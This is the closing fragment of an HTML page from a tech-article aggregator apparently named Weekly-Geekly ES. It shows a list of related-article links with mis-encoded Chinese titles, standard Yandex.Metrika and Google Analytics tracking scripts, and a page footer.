<li><a href="../zh-CN466099/index.html">æµ‹è¯•ç”¨äºè§†é¢‘æœåŠ¡çš„Webåº”ç”¨ç¨‹åºçš„åŠŸèƒ½</a></li>
<li><a href="../zh-CN466103/index.html">äº‘å®‰å…¨ç›‘æ§</a></li>
<li><a href="../zh-CN466105/index.html">ä½¿ç”¨RoadRunnerå¯¹Magento Rest APIè¶…é¢‘</a></li>
<li><a href="../zh-CN466107/index.html">è‡ªå·±åŠ¨æ‰‹çš„æ™ºèƒ½å®¶å±…ç³»ç»Ÿ</a></li>
<li><a href="../zh-CN466111/index.html">åŸ¹è®­Cisco 200-125 CCNA v3.0ã€‚ ç¬¬32å¤©ã€‚å¯†ç æ¢å¤ï¼ŒXMODEM / TFTPDNLDå’Œæ€ç§‘è®¸å¯è¯æ¿€æ´»</a></li>
<li><a href="../zh-CN466113/index.html">åœ¨PHPä¸­å®šä¹‰æ–‡æœ¬ç¼–ç ï¼Œè€Œä¸æ˜¯mb_detect_encoding</a></li>
<li><a href="../zh-CN466121/index.html">ä½¿ç”¨æ”¯æŒå¤éŸ³çš„æ³¢è¡¨æ–¹æ³•åœ¨AVRå¾®æ§åˆ¶å™¨ä¸Šç”Ÿæˆå£°éŸ³</a></li>
<li><a href="../zh-CN466123/index.html">æˆé•¿ã€‚ é‡é‡ ä¸‰ä¸ªé‚»å±…</a></li>
<li><a href="../zh-CN466127/index.html">å¯ä¹æ ¸ç”µç«™æˆ–ç«™åœ¨ååº”å †</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>